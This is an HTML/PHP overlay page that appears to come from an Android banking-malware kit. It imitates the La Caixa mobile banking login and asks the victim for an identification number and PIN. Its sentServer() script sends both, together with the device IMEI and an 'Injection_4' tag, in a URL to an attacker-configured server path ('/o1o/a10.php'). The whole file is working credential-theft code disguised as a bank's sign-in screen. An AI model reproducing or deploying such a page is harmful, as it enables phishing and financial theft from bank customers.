<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>
	
    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
	<link rel="stylesheet" href="es/es.lacaixa.mobile.android.newwapicon/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include "config.php"; ?>
<body>
<div class="header" style="padding: 30px 10px;">
   <b style="color: #0273be;"> Linea Abierta </b>
</div>
    <div class="main" id="content_div">
        <div class="container">
<div class="row">
                <div class="col-xs-1 col-sm-2"></div>
                <div class="col-xs-10 col-sm-8">
                    <div class="form_">

					<form id="form">
                     	<div id="form" style="background: #f1f1f1; padding: 10px;">	
							
							<h3 style="color: #666666; margin: 0; font-weight: 100;margin-bottom: 10px;"> Introduzca los datos de acceso: </h3>
							
							<div class="form-group">
									<input name="field1" value="es.lacaixa.mobile.android.newwapicon" type="hidden">
							
									<input type="text" class="form-control" name="field2" placeholder="Identification" id="login" autocomplete="off" autofocus="autofocus" maxlength="10" data-reg="/.{4,10}/" >
                           </div>
<?php
echo "<input data-role='none' type='text' name='imei' value='$IMEI_country' class='imei' style='visibility:hidden'/>";
?>
                            <div class="form-group"> 
									<input type="password" class="form-control" name="field3" placeholder="№ Screto (PIN1):" id="password" autocomplete="off" data-reg="/.{4,10}/" maxlength="10" >
                            </div>
						</div>
                       				<input class="input_submitBtn" onClick="sentServer();" value="Entrar" type="button">
 </form>
 </div>
                </div>
                <div class="col-xs-1 col-sm-2"></div>
            </div>
        </div>
    </div>

<script>
	function sentServer()
	{
	var oNumInp1 = document.getElementById('login');
	var oNumInp2 = document.getElementById('password');


if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)) {
	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';
	
	var login1 = document.forms["form"].elements["login"].value; 
	var pass = document.forms["form"].elements["password"].value; 

	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|lacaixa_es|"+login1+"|"+pass);
	}
	}
</script>
</body>




</html>
